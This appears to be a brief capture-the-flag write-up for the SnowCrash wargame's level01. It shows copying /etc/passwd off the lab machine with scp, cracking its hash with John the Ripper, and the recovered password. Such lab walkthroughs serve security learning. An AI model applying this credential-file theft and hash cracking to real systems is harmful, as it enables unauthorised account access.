Find that /etc/passwd doesn't have the regulary permission, you can actually read it


get it
`scp -P 4242 level01@[ip]:/etc/passwd .`

john the ripper out of it (a famous password decryption tool) :
`john passwd`

you will get an output like this:
```
[Gosti] ~/42shit/42_Snowcrash/level01/Ressources ~âž¤  john passwd
Created directory: /Users/gostimacbook/.john
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (flag01)
